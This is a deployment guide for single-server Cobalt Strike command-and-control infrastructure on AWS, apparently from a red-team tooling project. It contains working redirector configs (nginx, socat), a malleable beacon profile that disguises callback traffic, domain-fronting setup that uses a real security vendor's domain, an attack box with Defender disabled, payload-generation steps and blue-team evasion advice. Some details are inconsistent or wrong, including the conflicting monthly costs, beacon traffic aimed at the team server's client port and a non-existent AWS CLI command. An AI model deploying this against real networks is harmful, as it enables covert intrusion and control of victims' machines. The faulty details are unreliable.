# C2 Ad-Hoc - Single Team Server

## Overview

The **C2 Ad-Hoc** deployment provides a **lightweight, single-server Cobalt Strike infrastructure** designed for quick assessments, one-off tests, and proof-of-concept scenarios. This is the simplest C2 deployment mode.

## Architecture Components

### Infrastructure (Static IPs)

| Component | Type | Subnet | Private IP | Public IP | Purpose |
|-----------|------|--------|-----------|-----------|---------|
| **Bastion Host** | t3.medium (Windows + WSL2) | Management (10.0.0.0/24) | 10.0.0.10 | EIP (Elastic IP) | Operator entry point (RDP/SSH) |
| **Redirector 1** | t3.small (nginx HTTPS) | DMZ (10.0.1.0/24) | 10.0.1.10 | EIP (Elastic IP) | Traffic forwarding (primary) |
| **Redirector 2** | t3.small (nginx HTTPS) | DMZ (10.0.2.0/24) | 10.0.2.10 | EIP (Elastic IP) | Traffic forwarding (backup) |
| **C2 Team Server** | t3.medium (Cobalt Strike) | Private (10.0.10.0/24) | 10.0.10.10 | None | Cobalt Strike team server |
| **Attack Box** | t2.large (Windows 2022) | Private (10.0.10.0/24) | 10.0.10.50 | None | CS Client GUI, red team tools |
| **NAT Gateway** | Managed | Public | — | Auto | Outbound-only internet for private instances |

### Network Architecture

#### Internet Gateway vs NAT Gateway

The VPC has two gateways that serve fundamentally different purposes:

**Internet Gateway (IGW)** — Bidirectional, for public subnets:
- Inbound: Target beacon callbacks (HTTPS :443) arrive here, routed to redirectors
- Outbound: Any instance with an Elastic IP goes out through the IGW
- The Redirectors and Bastion all have EIPs and sit in public subnets routed through the IGW
- The operator at home connects to the Bastion's EIP through the IGW

**NAT Gateway** — Outbound only, for private subnets:
- The C2 Team Server and Attack Box sit in private subnets with NO public IPs
- When they need internet (apt updates, git clone, S3 downloads), traffic goes out via NAT
- Nothing from the internet can initiate a connection to private instances via NAT

#### How Elastic IPs Work (Single NIC, Not Dual-Homed)

The Bastion, Redirector 1, and Redirector 2 each have a **single NIC** with a private IP. The Elastic IP (EIP) is **not a second interface** — it's a 1-to-1 NAT mapping performed transparently by AWS at the Internet Gateway:

```
Bastion has 1 NIC → 1 private IP: 10.0.0.10

AWS translates at the IGW (the instance never sees the public IP):
  Inbound:  Operator connects to EIP (e.g. 54.x.x.x) → IGW translates → 10.0.0.10
  Outbound: 10.0.0.10 sends traffic out → IGW translates → appears as 54.x.x.x
```

If you RDP into the bastion and run `ipconfig`, you'll see **one NIC with 10.0.0.10** — the EIP never appears on the instance itself. AWS handles public↔private translation at the IGW before traffic reaches the instance.

The bastion reaches private subnet instances (C2 at 10.0.10.10, Attack Box at 10.0.10.50) via **VPC internal routing** — all subnets in the same VPC can communicate through the local route table entry (`10.0.0.0/16 → local`). Security groups control which traffic is allowed between subnets, not routing.

#### Standard Mode (Redirectors Only)
```
Internet
   ↓
Internet Gateway (bidirectional — public subnet instances have EIPs)
   ↓
Management Subnet (10.0.0.0/24)
   └── Bastion Host (10.0.0.10, EIP) ← Operator RDP/SSH entry point
   ↓
DMZ Subnets (10.0.1.0/24, 10.0.2.0/24)
   ├── Redirector 1 (10.0.1.10, EIP) ← Beacon traffic (port 443)
   └── Redirector 2 (10.0.2.10, EIP) ← Beacon traffic (port 443)
   ↓
Private Subnet (10.0.10.0/24) — NO public IPs, no direct internet access
   ├── C2 Team Server (10.0.10.10)  ← Cobalt Strike (port 50050)
   └── Attack Box (10.0.10.50)      ← Windows workstation (CS Client, tools)
   ↓
NAT Gateway → Internet (outbound only — updates, S3 downloads, git clone)
```

#### Domain Fronting Mode (Optional)
```
Internet
   ↓
CloudFront (CDN edge)          ← Beacon traffic to front domain
   ↓                              Host header → your back domain
Internet Gateway
   ↓
Management Subnet (10.0.0.0/24)
   └── Bastion Host (10.0.0.10, EIP) ← Operator RDP/SSH entry point
   ↓
DMZ Subnets (10.0.1.0/24, 10.0.2.0/24)
   ├── Redirector 1 (10.0.1.10, EIP) ← Origin for CloudFront (HTTPS only)
   └── Redirector 2 (10.0.2.10, EIP) ← Origin for CloudFront (HTTPS only)
   ↓
Private Subnet (10.0.10.0/24) — NO public IPs
   ├── C2 Team Server (10.0.10.10)  ← Cobalt Strike (port 50050)
   └── Attack Box (10.0.10.50)      ← Windows workstation (CS Client, tools)
   ↓
NAT Gateway → Internet (outbound only)

Security: Redirector ingress locked to CloudFront IPs only
SSL: ACM cert (Client→CloudFront), Self-signed (CloudFront→Redirector)
```

## Key Features

### 1. Single Team Server Design
- **One Cobalt Strike instance** for all operations
- **Simplified management** - single point of configuration
- **Cost-effective** - minimal AWS resources
- **Perfect for**:
  - Quick pentests (1-2 weeks)
  - Proof-of-concept engagements
  - Training exercises
  - Budget-constrained projects

### 2. Redundant Redirectors
- **Two redirector instances** for high availability
- **Load distribution** across redirectors
- **If one fails**, the other maintains operations
- **Supports multiple domains** for domain fronting

### 3. Traffic Flow

#### Standard (Redirectors Only)
```
Target → HTTPS (443) → Redirector 1/2 → Forward → C2 Server (50050)
                          ↓
                    nginx/socat proxy
                  (SSL termination)
```

#### With Domain Fronting (Optional)
```
Target → HTTPS to front domain (e.g. grid.crowdstrike.com)
       → Host header: your-domain.cloudfront.net
       → CloudFront edge → Redirector origin (Elastic IP)
       → Forward → C2 Server (50050)
```

| | Redirectors Only | + Domain Fronting |
|---|---|---|
| **Blue team sees** | Traffic to your domain | Traffic to front domain (e.g. crowdstrike.com) |
| **Redirector IP** | Visible in DNS | Hidden behind CloudFront |
| **SSL** | Let's Encrypt or self-signed | ACM (auto, free) |
| **Setup time** | ~15 min | +15-30 min (CloudFront propagation) |
| **Domain burned?** | Re-point DNS | Switch to backup domain (instant) |

### 4. Attack Box (Windows Workstation)
- **Windows Server 2022** optimized for red team operations (server bloat removed, Defender disabled)
- **Cobalt Strike Client GUI** — pre-installed from S3, desktop shortcut to connect to C2 server
- **Red team tools** — cloned from GitHub repo to `C:\Tools` (PowerSploit, SharpTools, etc.)
- **Payload staging** — empty `C:\Payloads` directory for operator use during engagement
- **WSL2 with Ubuntu** — Linux tooling available alongside Windows
- **Private subnet only** (10.0.10.50) — no public IP, accessed via bastion RDP tunnel
- **Toggleable** — `enable_attack_box = true` (default), can be disabled to save costs

### 5. Operator Access Patterns

#### Option A: SSH Tunnel to C2 (Recommended for CS Client on laptop)
```bash
# Create SSH tunnel from your laptop through bastion to C2 server
ssh -i key.pem -L 50050:10.0.10.10:50050 ubuntu@<bastion-eip>

# Connect Cobalt Strike client on your laptop to localhost
Host: 127.0.0.1:50050
```

#### Option B: RDP to Attack Box (Recommended for full workstation)
```bash
# RDP to bastion first (port 3389)
mstsc /v:<bastion-eip>

# From bastion, RDP tunnel to attack box at 10.0.10.50:3389
# Or set up a local RDP tunnel from your laptop:
ssh -i key.pem -L 3390:10.0.10.50:3389 ubuntu@<bastion-eip>
mstsc /v:localhost:3390

# Attack box has CS Client pre-installed — double-click desktop shortcut
# Connects to C2 server at 10.0.10.10:50050 (same private subnet, direct access)
```

#### Option C: RDP to Bastion Only
```bash
# RDP to bastion (Windows + WSL2)
mstsc /v:<bastion-eip>

# From bastion WSL2, SSH tunnel to C2 server
ssh -L 50050:10.0.10.10:50050 ubuntu@10.0.10.10

# Run CS client from bastion connecting to localhost:50050
```

## Deployment

### Configuration

```hcl
# terraform.tfvars
engagement_type = "adhoc"  # Auto-configures single mode

# Or explicitly:
c2_deployment_mode = "single"
c2_server_instance_type = "t3.medium"
redirector_count = 2
redirector_instance_type = "t3.small"

# Network
vpc_cidr = "10.0.0.0/16"
public_subnet_cidrs = ["10.0.1.0/24", "10.0.2.0/24"]
private_subnet_cidrs = ["10.0.10.0/24", "10.0.11.0/24"]

# Domains (REQUIRED)
primary_domain_name = "operations.company.com"
backup_domains = ["cdn.company.com"]

# Access Control
management_cidr_blocks = ["YOUR.PUBLIC.IP/32"]
```

### Via Web Application

1. Navigate to **Configuration** page
2. Set **Engagement Type**: "Ad-Hoc"
3. Upload **Cobalt Strike distribution** file
4. Configure **Domain** (required)
5. Click **Deploy**
6. Wait 15-20 minutes for provisioning

### Via Command Line

```bash
# 1. Upload Cobalt Strike file
cp cobaltstrike-dist.tar uploads/

# 2. Deploy infrastructure
cd terraform
terraform init
terraform apply -var="engagement_type=adhoc"

# 3. Get connection info
terraform output c2_connection_info
```

## SSL/TLS Options

| Option | How it works | OPSEC | When to use |
|--------|-------------|-------|-------------|
| **Let's Encrypt** | Certbot auto-provisions trusted cert via DNS challenge | Trusted by browsers and proxies. Appears in Certificate Transparency logs. | Standard deployments without domain fronting |
| **Self-Signed** | Generated during redirector setup | Flagged by Shodan/Censys. Blocked by corporate proxies. Browser warnings. | Testing only, or as CloudFront→Redirector origin cert |
| **ACM (with Domain Fronting)** | AWS auto-provisions free cert, validates via Route 53 DNS | Trusted, no CT log exposure for internal traffic. Front domain's cert used publicly. | When domain fronting is enabled |

### SSL Flow: Standard (No Domain Fronting)
```
Target → HTTPS → Redirector (Let's Encrypt or self-signed cert) → C2 Server
```

### SSL Flow: With Domain Fronting
```
Target → HTTPS → Front domain cert (not yours)
       → CloudFront → ACM cert (auto-provisioned, free)
       → Redirector → Self-signed cert (CloudFront doesn't verify origin)
       → C2 Server
```

When domain fronting is enabled, Let's Encrypt is not needed. ACM handles the public-facing SSL automatically, and the redirector uses a self-signed cert for the CloudFront-to-origin connection.

## Security Groups

### Redirector Security Group

**Standard mode:**
```yaml
Inbound:
  - Port 80 (HTTP): 0.0.0.0/0
  - Port 443 (HTTPS): 0.0.0.0/0
  - Port 22 (SSH): <bastion-private-ip>/32

Outbound:
  - Port 50050: <c2-server-private-ip>/32  # To team server
  - Port 443: 0.0.0.0/0  # For updates
```

**With domain fronting** (redirector locked to CloudFront IPs only):
```yaml
Inbound:
  - Port 80 (HTTP): com.amazonaws.global.cloudfront.origin-facing  # AWS managed prefix list
  - Port 443 (HTTPS): com.amazonaws.global.cloudfront.origin-facing
  - Port 22 (SSH): <bastion-private-ip>/32

Outbound:
  - Port 50050: <c2-server-private-ip>/32  # To team server
  - Port 443: 0.0.0.0/0  # For updates
```

### C2 Server Security Group
```yaml
Inbound:
  - Port 50050: <redirector-sg>  # From redirectors
  - Port 50050: <bastion-private-ip>/32  # From bastion (management)
  - Port 22: <bastion-private-ip>/32  # SSH from bastion

Outbound:
  - All traffic: 0.0.0.0/0
```

### Bastion Security Group
```yaml
Inbound:
  - Port 3389 (RDP): <management_cidr_blocks>
  - Port 22 (SSH): <management_cidr_blocks>

Outbound:
  - All traffic: 0.0.0.0/0
```

## Operational Use Cases

### Use Case 1: Quick Pentest (1-2 weeks)

**Scenario**: Small business assessment, limited scope

```
Day 1-2: Deploy infrastructure
Day 3-7: Initial access & lateral movement
Day 8-10: Privilege escalation & persistence
Day 11-12: Data collection & cleanup
Day 13-14: Reporting & debrief
Day 15: Destroy infrastructure
```

**Why Ad-Hoc Works**:
- Single team server sufficient for small environment
- Short engagement doesn't justify complex infrastructure
- Cost-effective (~$60/month vs ~$120 for full red team)

### Use Case 2: Proof-of-Concept Demo

**Scenario**: Demonstrate specific attack technique to client

```bash
# 1. Deploy infrastructure (1 hour)
terraform apply

# 2. Configure listener
listeners → Add → HTTPS
Hosts: operations.company.com
Port: 443
(Redirector forwards to team server)

# 3. Generate payload
Attacks → Packages → Windows Executable

# 4. Demo attack to client
# 5. Destroy infrastructure same day
terraform destroy
```

### Use Case 3: Training Exercise

**Scenario**: Train junior red teamers on C2 infrastructure

```
Week 1: Deploy and familiarize with architecture
Week 2: Practice beacon deployment
Week 3: Lateral movement techniques
Week 4: OpSec and cleanup
```

## Redirector Configuration

### nginx Configuration Example

```nginx
# /etc/nginx/sites-available/c2-redirector
upstream c2_backend {
    server 10.0.10.10:50050;  # C2 team server
}

server {
    listen 443 ssl http2;
    server_name operations.company.com;

    ssl_certificate /etc/letsencrypt/live/operations.company.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/operations.company.com/privkey.pem;

    location / {
        proxy_pass https://c2_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_verify off;
    }
}
```

### socat Configuration Example

```bash
# Simple TCP forwarding
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:10.0.10.10:50050

# With SSL termination
socat OPENSSL-LISTEN:443,cert=/etc/ssl/cert.pem,key=/etc/ssl/key.pem,verify=0,fork \
  TCP4:10.0.10.10:50050
```

## Beacon Configuration

### HTTPS Beacon Profile

```
set sample_name "Ad-Hoc Beacon";
set sleeptime "5000";
set jitter "20";

https-certificate {
    set CN "operations.company.com";
    set O "Legitimate Company";
    set validity "365";
}

http-get {
    set uri "/api/v1/status /api/v2/updates";
    
    client {
        header "Host" "operations.company.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        
        metadata {
            netbios;
            prepend "SESSION=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/json";
        header "Server" "nginx/1.18.0";
        
        output {
            print;
        }
    }
}
```

## Cost Breakdown

### Monthly Cost: ~$155-190

| Resource | Type | Cost/Month |
|----------|------|------------|
| C2 Server | t3.medium (24/7) | ~$30 |
| Redirector 1 | t3.small (24/7) | ~$15 |
| Redirector 2 | t3.small (24/7) | ~$15 |
| Bastion | t3.medium (24/7) | ~$30 |
| Attack Box | t2.large (24/7) | ~$50 |
| NAT Gateway | (Optional) | ~$32 |
| EBS Storage | 200GB total | ~$15 |
| Data Transfer | Minimal | ~$5-10 |
| S3 | CS files + scripts | <$1 |
| **Total (no NAT)** | | **~$160** |
| **Total (with NAT)** | | **~$192** |

### Cost Optimization

#### Short Engagements (1-2 weeks)
```
Daily cost: ~$3-4/day
2-week engagement: $42-56 total
Destroy immediately after: No ongoing costs
```

#### Proof-of-Concept (1-2 days)
```
Hourly cost: ~$0.13/hour
Weekend demo: $6-12 total
Perfect for quick demos
```

## Monitoring & Logging

### CloudWatch Logs

```bash
# View C2 server logs
aws logs tail /aws/ec2/c2-server --follow

# View redirector logs
aws logs tail /aws/ec2/redirector-1 --follow

# View all beacon callbacks
aws logs filter-pattern "POST /api/v1/status" --log-group-name /aws/ec2/redirector-1
```

### Metrics to Monitor

- **Beacon check-ins** - Frequency and pattern
- **Data transfer** - Upload/download volumes
- **Failed connections** - Potential blue team detection
- **Redirector health** - Response times, errors

## Troubleshooting

### Issue: Beacon won't call back

**Diagnosis**:
```bash
# 1. Check redirector can reach C2 server
ssh redirector1
nc -zv 10.0.10.10 50050

# 2. Check nginx/socat is running
systemctl status nginx
ps aux | grep socat

# 3. Test with curl
curl -k https://operations.company.com
```

**Solution**:
- Verify security groups allow traffic
- Check redirector configuration
- Ensure C2 server is running on port 50050

### Issue: Cannot connect to team server

**Diagnosis**:
```bash
# From bastion
telnet 10.0.10.10 50050

# Check Cobalt Strike is running
ssh c2-server
ps aux | grep teamserver
```

**Solution**:
```bash
# Restart teamserver if needed
sudo systemctl restart cobaltstrike
# Or manually:
cd /opt/cobaltstrike
sudo ./teamserver 10.0.10.10 <password>
```

### Issue: SSL certificate errors

**Diagnosis**:
```bash
# Check certificate on redirector
openssl s_client -connect operations.company.com:443 -servername operations.company.com
```

**Solution**:
```bash
# Regenerate LetsEncrypt certificate
sudo certbot renew --nginx
sudo systemctl reload nginx
```

## Best Practices

### OpSec Considerations

✅ **Use legitimate-looking domains**
- operations.company.com ✅
- update-service.company.com ✅
- c2server.evil.com ❌

✅ **Randomize beacon sleep times**
- Base: 5000ms, Jitter: 20% ✅
- Fixed: 1000ms ❌

✅ **Use HTTPS, not HTTP**
- Always encrypt C2 traffic
- Use valid SSL certificates

✅ **Monitor for detection**
- Check redirector logs for scanning
- Look for repeated failed connections
- Watch for unusual traffic patterns

### Cleanup After Engagement

1. **Collect artifacts** before destruction
   ```bash
   # Download from S3
   aws s3 sync s3://red-team-artifacts .artifacts/
   ```

2. **Destroy infrastructure**
   ```bash
   terraform destroy
   ```

3. **Verify deletion**
   ```bash
   aws ec2 describe-instances --filters "Name=tag:Project,Values=RedTeamInfra"
   # Should return empty
   ```

4. **Clean local files**
   ```bash
   rm -rf uploads/cobaltstrike-dist.tar
   rm -rf ssh_keys/*
   ```

## When to Upgrade

### Upgrade to Purple Team Mode if:
- ❗ Need redundancy for longer engagements
- ❗ Multiple operators require simultaneous access
- ❗ Client requires high-availability SLA

### Upgrade to Full Red Team Mode if:
- ❗ Need phase-based operations
- ❗ Long-term engagement (>4 weeks)
- ❗ Advanced OpSec requirements
- ❗ Different C2 profiles per phase

## References

- [Cobalt Strike Team Server Setup](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/)
- [Redirector Best Practices](https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/)
- [Malleable C2 Profiles](https://github.com/threatexpress/malleable-c2)

## Summary

C2 Ad-Hoc is **perfect for**:
- ✅ Quick assessments (1-2 weeks)
- ✅ Proof-of-concept demos
- ✅ Training exercises
- ✅ Budget-constrained projects
- ✅ Small target environments

**Trade-offs**:
- ❌ No redundancy (single team server)
- ❌ Not suitable for long engagements
- ❌ Limited scalability

**Cost**: ~$160-192/month (or ~$75-90 for 2-week engagement)

For simple, short-term engagements, this is your best choice!
